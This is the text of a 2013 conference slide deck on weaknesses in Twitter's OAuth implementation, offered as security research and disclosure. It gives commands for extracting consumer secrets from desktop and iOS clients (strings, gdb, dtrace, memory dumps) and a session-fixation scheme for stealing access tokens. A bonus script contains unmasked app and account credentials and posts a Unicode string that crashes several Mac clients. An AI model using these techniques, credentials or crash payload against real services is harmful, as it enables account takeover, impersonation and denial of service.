Abusing Twitter API & OAuth Implementation
Nicolas Seriot
April 10th, 2013
Hack In The Box Amsterdam, NL

Abstract
Since March 2013, Twitter's new web API requires every request with a user context to be signed with OAuth.This mechanism is supposed to prevent abuse and also allow Twitter to ban third-party clients who do not adhere to their new, much stricter terms of service.
After studying how Twitter API uses OAuth, it turns out that the required authentication is inefficient in letting Twitter control third party applications. A rogue client can impersonate a `blessed' client by using its OAuth consumer tokens and access the API unnoticed. Consumer tokens are supposed to be kept secret, but we'll see various fun and dynamic reverse engineering techniques for extracting them from popular Twitter clients, including the latest versions for OS X and iOS.
We also found that Twitter allows several third-party clients to redirect oauth verifiers to a URL defined by the client. As you can impersonate the client, you can redirect the oauth verifier to your own pirate server. I'll explain how to trick someone into giving you access tokens for his account without noticing and without moving away from Twitter's secure website.
I'll end by discussing the Twitter API from a security standpoint and explain that to a great extent, many issues are caused by a fundamental mistake ­ Taking OAuth authentication from the web to the desktop.

Bio · iOS / Cocoa dev. · Software Engineer · Master in Economic
Crime Investigation
· Twitter user since July, 2008
· Father of a 10 months old baby today!

Agenda
1. Twitter 2. OAuth 3. Ripping Consumer Tokens 4. iOS / OS X + STTwitter 5. Discussion

API
Tweets/day

now $8 billion valuation, top-10 most visited websites
5000 1M

340M 140M 2250 65

Twitter launch
2006

verified accounts trending (celebrities) topics

promo. Dick promo. no tweets Costolo tweets more
web CEO mobile RSS

2007 2008 2009 2010 2011 2012 2013

Tweetie TweetDeck

stricter ToS,

buyout buyout

display guidelines

last OS X client update v. 1.1

HTTP Basic Authentication

OAuth API v. 1.0

· The author's name and @username must be displayed to the right of the avatar. · Reply, Retweet and Favorite Tweet actions must always be available. · No other 3rd party actions similar to Follow, Reply, Retweet may be attached to a Tweet. · The Twitter logo or Follow button for the Tweet author must always be displayed. · The Tweet timestamp must always be linked to the Tweet permalink. · A timeline must not be rendered with non-Twitter content. e.g. from other networks.
https://dev.twitter.com/terms/display-requirements
· Max. 100'000 users per Twitter client app.
· "Twitter discourages development in this area"
https://dev.twitter.com/terms/api-terms

Enforcing / Breaking the Rules
· March 2013: OAuth authentication for
every API request with user context
· "We reserve the right to revoke your app"
https://dev.twitter.com/terms/api-terms
· Can a rogue client spoof the identity of a
regular client and use the API as it wants?

Agenda
1. Twitter 2. OAuth 3. Ripping Consumer Tokens 4. iOS / OS X + STTwitter 5. Discussion

http://hueniverse.com/2007/09/oauth-isnt-always-the-solution/

Notation

client

server

1. client sends a yellow token

request_token

2. server responds with a blue token

3. client sends a yellow token and signs the request with a red token

request_token

4. server responds with a blue token

3 phases Auth. Web

@nst021

bit.ly

Twitter

"Use my account"

request_token

authorize

access_token

home_timeline

green tokens are for @nst021 with bit.ly

@nst021 / Twitter.app Twitter

3 phases Auth. Desktop

request_secret request_key consumer_secret consumer_key verifier
access_secret access_key

request_token authorize

access_token

home_timeline

green tokens are for @nst021 with Twitter.app

@nst021 / iOS

Twitter

xAuth: 1 phase Authentication

consumer_secret consumer_key
access_secret access_key username password

access_token

home_timeline

green tokens are for @nst021 with iOS

iOS

Twitter

oauth2/token

App. Only Authentication

consumer_secret consumer_key bearer_token

user_timeline
oauth2/ invalidate_token

violet token is for iOS

Consumer Tokens
· In all four cases, consumer tokens are needed to authenticate with Twitter. request_token

Agenda
1. Twitter 2. OAuth 3. Ripping Consumer Tokens 4. iOS / OS X + STTwitter 5. Discussion

A. dump the strings
$ strings /Applications/Twitter.app/ \ Contents/MacOS/Twitter
3rJOl1ODzm9yZy63FACdg 5jPo**************************************

Test the Tokens
#!/usr/bin/env python
import tweepy
CONSUMER_KEY = '3rJOl1ODzm9yZy63FACdg' CONSUMER_SECRET = '5jPo**************************************'
auth = tweepy.OAuthHandler(CONSUMER_KEY, CONSUMER_SECRET) auth_url = auth.get_authorization_url() print "Please authorize:", auth_url
verifier = raw_input('PIN: ').strip() auth.get_access_token(verifier)
print "ACCESS_KEY:", auth.access_token.key print "ACCESS_SECRET:", auth.access_token.secret
demo

A. dump the strings

0xFFFFFFFF

B. dump functions return values

Stack

Shared libraries

Heap
Data Text
0x00000000

/usr/bin/gdb
$ gdb attach <PID of OS X accountsd>
(gdb) b -[OACredential consumerKey] (gdb) finish (gdb) po $rax tXvOrlJDmLnTfiUqJ3Kuw
(gdb) b -[OACredential consumerSecret] (gdb) finish (gdb) po $rax AWcB**************************************

/usr/bin/gdb
$ gdb attach <PID of iPhoneSimulator accountsd>
(gdb) b -[OACredential consumerKey] (gdb) finish (gdb) po (int*)$eax WXZE9QillkIZpTANgLNT9g
(gdb) b -[OACredential consumerSecret] (gdb) finish (gdb) po (int*)$eax Aau5**************************************
demo

A. dump the strings

0xFFFFFFFF

B. dump functions return values

Stack

C. dump deallocated pointers

Shared libraries

Heap
Data Text
0x00000000

Logging Freed Strings
$ sudo dtrace -n 'pid$target::free:entry { \ printf("%s", arg0 != NULL ? \ copyinstr(arg0) : \ "<NULL>"); }' -p 10123

Objective-C Variant
@implementation NSString (XX) + (void)load {
Swizzle([NSString class], @selector(dealloc), @selector(my_dealloc)); } - (void)my_dealloc { NSLog(@"%@", self); [self my_dealloc]; } @end
(gdb) p (char)[[NSBundle bundleWithPath: @"/Library/Frameworks/XX.framework"] load]

A. dump the strings

0xFFFFFFFF

B. dump functions return values

Stack

C. dump deallocated pointers

Shared libraries

Heap
Data Text
0x00000000

D. dump the whole
process memory

Dumping Process Memory
# from Mac OS X Internals by Amit Singh $ sudo ./gcore64 -c /tmp/dump.bin 4149
# remove Mach-O magic header $ printf '\x00\x00\x00\x00' | \
dd conv=notrunc of=/tmp/dump.bin
$ strings dump.bin | \ sort -u > /tmp/dump.txt
# key=consumerSecret& $ egrep "[a-zA-Z0-9]{20}&$" /tmp/dump.txt

A. dump the strings

0xFFFFFFFF

B. dump functions return values

Stack

C. dump deallocated pointers

Shared libraries

E. search Google / pastebin / GitHub

Heap
Data Text
0x00000000

D. dump the whole process
memory

Agenda
1. Twitter 2. OAuth 3. Ripping Consumer Tokens 4. iOS / OS X + STTwitter 5. Discussion

OS X Twitter Credentials
Accounts.framework
@nst021 xxxxxx

can use OS X consumer tokens

can use custom can use "app only"

consumer tokens

authentication

STTwitter

STTwitterAPIWrapper
+ twitterAPIWith... - getHomeTimeline - postStatus
STTwitterOAuthProtocol
STTwitterOAuth STTwitterAppOnly STOAuthOSX
STHTTPRequest

Accounts.framework Social.framework

STTwitter

https://github.com/nst/STTwitter demo from 37.31517, 141.02580

to be integrated into Adium

TwitHunter
https://github.com/nst/TwitHunter

Conversations Visualization
· as Usenet client MacSOUP did many years ago

Mapping Binary to Unicode
165 bytes in 106 characters, fit in a tweet!
https://github.com/nst/UniBinary

$ ./micro_macho Hello world

Dissection of a hacky but valid Intel 32 bits, 164 bytes, Mach-O "Hello world" executable file.

$ shasum micro_macho e67bddcc7ba3f8446a63104108c2905f57baadbe

http://seriot.ch/hello_macho.php

Nicolas Seriot, 2013-01-06 19:00

Offset Actual bytes

Struct Field

Value

Comment

Summary

Mach Header

LC_SEGMENT (__TEXT)

Load Commands LC_UNIXTHREAD

0x00 0x04 0x08 0x0C 0x10 0x14 0x18 0x1C 0x20 0x24 0x28 0x2C 0x30 0x34 0x38 0x3C 0x40 0x44 0x48 0x4C 0x50 0x54 0x58 0x5C 0x60 0x64 0x68 0x6C 0x70 0x74 0x78 0x7C 0x80 0x84 0x88 0x8C 0x90 0x94 0x98 0x9C 0xA0

CE FA ED FE 07 00 00 00 03 00 00 00 02 00 00 00 02 00 00 00 88 00 00 00 01 00 00 00 01 00 00 00 38 00 00 00 48 65 6C 6C 6F 20 77 6F 72 6C 64 0A 00 FF FF FF 00 00 00 00 00 10 00 00 00 00 00 00 2E 00 00 00 07 FF FF FF 05 FF FF FF 00 00 00 00 FF FF FF FF 05 00 00 00 50 00 00 00 01 00 00 00 10 00 00 00 FF 00 FF FF 6A 0C 68 24 00 00 00 6A 01 B0 04 83 EC 04 CD 80 83 C4 10 6A 00 EB 11 FF 00 00 00 00 FF FF FF FF FF 00 FF FF 68 00 00 00 B0 01 83 EC 04 CD 80 FF FF FF FF FF 00 00 FF FF 00 00 FF FF

i386_thread_state

thread_ command

segment_command

mach_header

magic cputype cpusubtype filetype ncmds sizeofcmds flags cmd cmdsize segname
vmaddr vmsize fileoff filesize maxprot initprot nsects flags
cmd cmdsize flavor
count eax ebx ecx edx edi esi ebp esp ss
eflags eip cs ds es fs gs

MH_MAGIC CPU_TYPE_I386 CPU_SUBTYPE_I386_ALL MH_EXECUTE 2 0x88 (136) MH_NOUNDEFS LC_SEGMENT 0x38 (56) db 'Hell' db 'o wo' db 'rld', 0Ah db 0 0x0 0x1000 0x0 0x2E (46) rwx r-x 0
LC_UNIXTHREAD 0x50 (80) x86_THREAD_STATE32 0x10 (16) 0
0 0 0 0x68
0 0 0

mach magic number identifier cpu specifier machine specifier type of file number of load commands the size of all the load commands flags LC_SEGMENT includes sizeof section structs segment name
memory address of this segment memory size of this segment file offset of this segment amount to map from the file maximum VM protection initial VM protection number of sections in segment flags LC_UNIXTHREAD total size of this command flavor of thread state count of longs in thread state
jump 17 bytes

Mach-O executable file, 32 bits, i386
one .text segment to be loaded in a 1kB
memory page
the initial state of the registers, the entry point $eip is at 0x68

https://seriot.ch/hello_macho.php

Pack 3 Bytes into 2 Unicode Characters

A B |C D |E F

10101011 11001101 11101111

[-----------][-----------]

ABC

DEF

\u4E00+0xABC \u4E00+0xDEF





https://github.com/nst/UniBinary

Agenda
1. Twitter 2. OAuth 3. Ripping Consumer Tokens 4. iOS / OS X + STTwitter 5. Discussion

1. Taking OAuth from web to Desktop was a conceptual error. Consumer tokens simply just cannot be kept secret on the Desktop.

@nst021

bit.ly

"Use my account"

Twitter

request_token

Desktop Web

request_token

2. Twitter cannot realistically revoke leaked keys from popular clients, especially from OS X / iOS.
3. xAuth vs. HTTP Digest Authentication: client applications don't need to store passwords, but this password is sent over the network in the request token phase.
4. This new "App Only" authentication is both ineffective and dangerous.

App. Only Authentication

Some App.
Use the consumer tokens to get the bearer token and exhaust the limits. Denial of service.

token

Twitter

consumer_secret consumer_key bearer_token

user_timeline

And now you can invalidate the bearer token.
Denial of service for "Some App."!

invalidate_token

violet token is for Some App.

5. OAuth is a convoluted process which cannot reliably identify the client, and additionally puts the users at risk, eg.: - new password do not invalidate existing access tokens - badly configured applications expose users to session fixation attack
Session Fixation Attack Demo

The Pirate

Twitter

request_token with custom callback

verifier is sent to the custom
callback

The Victim

authorize

authorize

eg. tweetdeck://xxx

access_token

access tokens!

home_timeline

the victim authorizes his own account,
but twitter sends the verifier to the
pirate

The Pirate

The Victim

Twitter

seriot.ch/twitter.php

redirect

redirect

The Risks
· Hack some news agency, announce $AAPL profit warning and... profit!
· Make fun of your favorite politician · Blackmail... you name it

6. I have to conclude that the real grounds for using OAuth is neither "security" nor spam fighting but desire to control thirdparty client applications, possibly to please big media, consumers and advertisers.
7. Sadly for Twitter, ensuring that the requests come from a certain client application is a very hard problem, and I am not sure if it can be solved, except of course by killing the API going the Skype way.

Recap
1. Twitter 2. OAuth 3. Ripping Consumer Tokens 4. iOS / OS X + STTwitter 5. Discussion

Bonus Slides... ...if we have the time

Abusing Twitter API Clients

Abusing Twitter API Clients
#!/usr/bin/env python # -*- coding: utf-8 -*-
import tweepy
# instagram CONSUMER_KEY = "7YBPrscvh0RIThrWYVeGg" CONSUMER_SECRET = "sMO1vDyJ9A0xfOE6RyWNjhTUS1sNqsa7Ae14gOZnw"
# nst022 OAUTH_TOKEN = "1294332967-LKFa8SA3vmSf8bakzrWDqRkO8jn3n8BXJwCb3yX" OAUTH_SECRET = "DtOKoUh6ocMgDWwqYw1F7xceNp9LyFR8sufpIgNjZQ"
auth = tweepy.OAuthHandler(CONSUMER_KEY, CONSUMER_SECRET) auth.set_access_token(OAUTH_TOKEN, OAUTH_SECRET)
api = tweepy.API(auth)
s = u'\u0647\u0020\u0488\u0488\u0488'
print api.update_status(s)

Abusing Twitter API Clients

Twitter.app Socialite.app Twitterrific.app

$ gdb Twitter
(gdb) r Starting program: /Applications/Twitter.app/Contents/MacOS/Twitter
Program received signal EXC_BAD_ACCESS, Could not access memory. Reason: KERN_INVALID_ADDRESS at address: 0x00000001084e8008 0x00007fff9432ead2 in vDSP_sveD ()
(gdb) bt #0 0x00007fff9432ead2 in vDSP_sveD () #1 0x00007fff934594fe in TStorageRange::SetStorageSubRange () #2 0x00007fff93457d5c in TRun::TRun () #3 0x00007fff934579ee in CTGlyphRun::CloneRange () #4 0x00007fff93466764 in TLine::SetLevelRange () #5 0x00007fff93467e2c in TLine::SetTrailingWhitespaceLevel () #6 0x00007fff93467d58 in TRunReorder::ReorderRuns () #7 0x00007fff93467bfe in TTypesetter::FinishLineFill () #8 0x00007fff934858ae in TFramesetter::FrameInRect () #9 0x00007fff93485110 in TFramesetter::CreateFrame () #10 0x00007fff93484af2 in CTFramesetterCreateFrame () ...

Twitter: @nst021
Web: http://seriot.ch/abusing_twitter_api.php

